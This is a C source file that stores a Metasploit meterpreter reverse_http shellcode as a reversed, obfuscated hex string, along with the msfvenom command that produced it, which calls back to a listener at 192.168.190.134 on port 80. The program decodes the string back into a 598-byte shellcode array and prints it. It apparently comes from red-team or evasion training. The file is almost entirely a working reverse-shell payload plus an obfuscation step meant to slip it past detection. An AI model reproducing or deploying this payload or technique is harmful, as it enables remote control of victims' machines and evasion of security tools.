#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// compile: 
//  cl.exe /nologo /W0 /DNDEBUG /Tcreverse_hex_string.c /link /OUT:reverse_hex_string.exe /SUBSYSTEM:CONSOLE /MACHINE:x64

int main(void) {
	// msfvenom -p windows/x64/meterpreter/reverse_http LHOST=192.168.190.134 LPORT=80 -f csharp | tr -d \\n
	// python3 reverse_string.py
	char reversed_hex_string[] ="5dx0,ffx0,65x0,2ax0,5bx0,0fx0,2cx0,7cx0,94x0,95x0,Z,a6x0,85x0,3cx0,85x0,2dx0,57x0,0cx0,58x0,3cx0,1x0,84x0,7x0,b8x0,66x0,2bx0,47x0,0cx0,58x0,02x0,4cx0,38x0,84x0,5dx0,ffx0,Z,Z,Z,Z,2ex0,98x0,69x0,21x0,abx0,94x0,9fx0,98x0,94x0,Z,Z,02x0,Z,0cx0,7cx0,94x0,adx0,98x0,84x0,1fx0,98x0,84x0,7ex0,98x0,84x0,35x0,35x0,39x0,84x0,5dx0,ffx0,Z,Z,Z,Z,5ex0,35x0,4ax0,85x0,abx0,94x0,Z,Z,01x0,Z,0cx0,7cx0,94x0,01x0,2ex0,1cx0,1dx0,98x0,94x0,a5x0,04x0,a6x0,95x0,35x0,Z,Z,Z,55x0,8ex0,ccx0,bex0,2x0,47x0,fcx0,ffx0,84x0,5dx0,ffx0,Z,Z,Z,Z,0ex0,53x0,0fx0,44x0,abx0,94x0,Z,Z,31x0,88x0,1cx0,7cx0,84x0,f1x0,57x0,0cx0,58x0,5dx0,ffx0,b7x0,81x0,6x0,d2x0,2cx0,7cx0,94x0,35x0,35x0,9cx0,13x0,d4x0,9cx0,13x0,d4x0,1fx0,98x0,84x0,a5x0,35x0,f5x0,ax0,a6x0,6cx0,98x0,84x0,5dx0,ffx0,b3x0,e2x0,55x0,bex0,2cx0,7cx0,94x0,35x0,35x0,05x0,Z,Z,Z,Z,48x0,82x0,2x0,Z,8bx0,84x0,35x0,9cx0,13x0,d4x0,85x0,14x0,a5x0,35x0,1cx0,98x0,84x0,Z,75x0,e6x0,55x0,75x0,25x0,b4x0,63x0,85x0,c4x0,a4x0,67x0,63x0,84x0,47x0,83x0,85x0,34x0,46x0,b6x0,14x0,63x0,57x0,24x0,36x0,b4x0,33x0,44x0,b6x0,c6x0,86x0,a6x0,86x0,37x0,a7x0,e4x0,27x0,77x0,85x0,85x0,37x0,65x0,b4x0,d4x0,63x0,07x0,34x0,35x0,96x0,b6x0,27x0,67x0,a6x0,67x0,14x0,16x0,76x0,63x0,46x0,14x0,c6x0,55x0,23x0,a4x0,b6x0,a4x0,e6x0,17x0,63x0,a6x0,46x0,46x0,67x0,54x0,56x0,27x0,f2x0,Z,Z,Z,d4x0,8ex0,5dx0,ffx0,Z,Z,Z,Z,6cx0,f9x0,98x0,75x0,abx0,94x0,35x0,3x0,a6x0,35x0,35x0,9cx0,13x0,d4x0,Z,Z,Z,05x0,0cx0,7cx0,94x0,1cx0,98x0,84x0,a5x0,Z,43x0,33x0,13x0,e2x0,03x0,93x0,13x0,e2x0,83x0,63x0,13x0,e2x0,23x0,93x0,13x0,Z,Z,Z,01x0,8ex0,5dx0,ffx0,Z,Z,Z,Z,7ax0,97x0,65x0,a3x0,abx0,94x0,35x0,35x0,9cx0,13x0,d4x0,0cx0,13x0,d4x0,a5x0,35x0,1ex0,98x0,84x0,35x0,35x0,5dx0,ffx0,7x0,62x0,77x0,c4x0,2cx0,7cx0,94x0,1ex0,98x0,84x0,65x0,14x0,Z,47x0,56x0,e6x0,96x0,e6x0,96x0,77x0,ebx0,94x0,35x0,bdx0,13x0,84x0,d5x0,ffx0,ffx0,ffx0,b4x0,9ex0,21x0,b8x0,84x0,a5x0,95x0,14x0,85x0,0ex0,ffx0,25x0,14x0,02x0,cex0,38x0,84x0,a5x0,14x0,95x0,14x0,85x0,14x0,a5x0,95x0,0dx0,1x0,84x0,e5x0,85x0,14x0,85x0,14x0,88x0,4x0,b8x0,14x0,0dx0,1x0,94x0,c1x0,04x0,b8x0,44x0,84x0,cx0,b8x0,14x0,66x0,0dx0,1x0,94x0,42x0,04x0,b8x0,44x0,85x0,8dx0,57x0,1dx0,93x0,54x0,8x0,42x0,c4x0,3x0,c4x0,1fx0,57x0,0ex0,83x0,1cx0,1x0,14x0,dx0,9cx0,1cx0,14x0,cax0,0cx0,13x0,84x0,6dx0,1x0,84x0,88x0,43x0,b8x0,14x0,9cx0,ffx0,84x0,9cx0,13x0,d4x0,65x0,3ex0,0dx0,1x0,94x0,02x0,04x0,b8x0,44x0,81x0,84x0,b8x0,05x0,0dx0,1x0,84x0,76x0,47x0,0cx0,58x0,84x0,Z,Z,Z,88x0,08x0,b8x0,Z,Z,Z,27x0,58x0,fx0,2x0,bx0,81x0,87x0,18x0,66x0,0dx0,1x0,84x0,c3x0,24x0,b8x0,15x0,14x0,02x0,25x0,b8x0,84x0,25x0,dex0,2ex0,1cx0,1x0,14x0,dx0,9cx0,1cx0,14x0,02x0,c2x0,2x0,c7x0,16x0,c3x0,cax0,0cx0,13x0,84x0,9cx0,13x0,d4x0,05x0,27x0,b8x0,84x0,a4x0,a4x0,7bx0,fx0,84x0,02x0,25x0,b8x0,84x0,81x0,25x0,b8x0,84x0,06x0,25x0,b8x0,84x0,56x0,65x0,2dx0,13x0,84x0,15x0,25x0,05x0,14x0,15x0,14x0,Z,Z,Z,ccx0,8ex0,0fx0,4ex0,38x0,84x0,cfx0";

	// reverse the string
	char* hex_string = _strrev(reversed_hex_string);
	
	// declare a new shellcode byte array
	char shellcode[598];
	
	// define an index to keep track of where we're at
	int idx = 0;
	char *next_token = NULL;
		
	// add our first byte to the array
	if ( shellcode[idx] = strtol((strtok_s(hex_string, ",", &next_token)), NULL, 16))
	{
		// successfully converted string to long int
	}
	else
	{
		// conversion to long failed, meaning we don't have a valid hex vlue
		// replace our null byte placeholder with a null byte
		shellcode[idx] = strtol("0x00", NULL, 16);
	}	

	// Loop through remaining string to populate the array
	while (idx < sizeof(shellcode) - 1)
	{
		++idx;
		if ( shellcode[idx] = strtol((strtok_s(NULL, ",", &next_token)), NULL, 16))
		{
			printf("");
			// successfully converted string to long int
		}
		else
		{
			// conversion to long failed, meaning we don't have a valid hex vlue
			// replace our null byte placeholder with a null byte
			shellcode[idx] = strtol("0x00", NULL, 16);
		}	
	}

	idx = 0;
	while ( idx < sizeof(shellcode))
	{
		if (idx == (sizeof(shellcode) - 1) )
		{
			printf("0x%02x ", (unsigned char)shellcode[idx]);
		}
		else
		{
			printf("0x%02x, ", (unsigned char)shellcode[idx]);
		}
		idx++;
	}

    return 0;
	
}

